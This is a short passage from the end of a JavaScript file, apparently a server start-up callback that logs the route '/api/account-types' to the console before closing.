    console.log(`   → Account types: /api/account-types\n`);
});
